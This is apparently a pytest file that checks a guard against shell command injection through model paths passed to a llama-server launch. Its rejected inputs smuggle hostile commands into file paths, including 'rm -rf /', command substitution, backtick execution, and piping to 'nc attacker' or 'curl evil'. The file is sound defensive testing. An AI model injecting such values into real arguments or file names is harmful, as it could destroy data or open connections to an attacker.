"""Model-path validation before subprocess launch (Pepper CWE-78).

start_server launches llama-server with subprocess.Popen(args) in LIST form,
never shell=True, so there is no shell to inject into today. This guard is
defence-in-depth against a poisoned config file (and a future refactor that
might introduce a shell): a legitimate model path is a plain filesystem path,
so anything with shell metacharacters or control bytes is refused.
"""

import pytest

from core import llm_backend


def test_safe_model_paths_pass():
    for p in ("/models/model.gguf", "/app/models/Qwen3.5-9B-Q4_K_M.gguf", ""):
        assert llm_backend._assert_safe_model_path(p, "model_path") == p


def test_unsafe_model_paths_rejected():
    for bad in (
        "/models/x.gguf; rm -rf /",
        "/models/$(whoami).gguf",
        "/models/x.gguf\nmalicious",
        "/models/a`id`.gguf",
        "/models/x.gguf | nc attacker 1",
    ):
        with pytest.raises(RuntimeError, match="unsafe"):
            llm_backend._assert_safe_model_path(bad, "model_path")


def test_build_server_args_validates_paths():
    # Legit paths build normally.
    args = llm_backend._build_server_args(8000, "/models/m.gguf", "")
    assert "/models/m.gguf" in args
    # A poisoned model path is refused before it reaches the arg list.
    with pytest.raises(RuntimeError, match="unsafe"):
        llm_backend._build_server_args(8000, "/models/m.gguf; curl evil", "")
